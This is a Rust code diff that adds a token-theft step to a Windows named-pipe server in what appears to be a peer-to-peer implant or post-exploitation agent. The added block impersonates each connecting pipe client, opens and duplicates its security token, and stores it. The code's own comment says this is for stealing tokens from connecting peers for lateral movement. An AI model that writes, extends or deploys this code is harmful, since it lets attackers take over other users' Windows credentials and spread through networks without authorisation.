@@ -5358,6 +5358,57 @@ pub mod nt_pipe_server {
 
             let pipe = std::sync::Arc::new(NtPipeHandle::new(connected_handle));
 
+            // 2b. Token extraction from the connecting peer.
+            //     If the token_impersonation module is enabled, attempt to
+            //     extract the client's impersonation token from the pipe
+            //     connection.  This allows the pipe server to steal tokens
+            //     from connecting peers for lateral movement.
+            #[cfg(all(windows, feature = "token-impersonation"))]
+            {
+                if crate::token_impersonation::is_enabled() {
+                    // Briefly impersonate to extract the token.
+                    let ok = unsafe {
+                        winapi::um::namedpipeapi::ImpersonateNamedPipeClient(connected_handle as _)
+                    };
+                    if ok != 0 {
+                        // Extract the impersonation token from this thread.
+                        let mut token: winapi::um::winnt::HANDLE = std::ptr::null_mut();
+                        let open_ok = unsafe {
+                            winapi::um::processthreadsapi::OpenThreadToken(
+                                winapi::um::processthreadsapi::GetCurrentThread(),
+                                winapi::um::winnt::TOKEN_DUPLICATE
+                                    | winapi::um::winnt::TOKEN_QUERY
+                                    | winapi::um::winnt::TOKEN_IMPERSONATE,
+                                1, // OpenAsSelf = TRUE
+                                &mut token,
+                            )
+                        };
+                        // Immediately revert — we don't want to stay impersonated.
+                        unsafe { winapi::um::securitybaseapi::RevertToSelf() };
+
+                        if open_ok != 0 && !token.is_null() {
+                            let source = crate::token_impersonation::TokenSource::Pipe(
+                                self.pipe_path.clone(),
+                            );
+                            match crate::token_impersonation::import_token(token, source) {
+                                Ok(info) => {
+                                    log::info!("p2p-pipe: extracted token from peer: {info}");
+                                }
+                                Err(e) => {
+                                    log::debug!("p2p-pipe: token import failed: {e:#}");
+                                }
+                            }
+                            // Close the original token — import_token duplicates it.
+                            unsafe { winapi::um::handleapi::CloseHandle(token) };
+                        }
+                    } else {
+                        log::debug!(
+                            "p2p-pipe: ImpersonateNamedPipeClient failed for token extraction"
+                        );
+                    }
+                }
+            }
+
             // 3. Read the LinkRequest frame.
             let frame = match pipe.read_frame() {
                 Ok(f) => f,
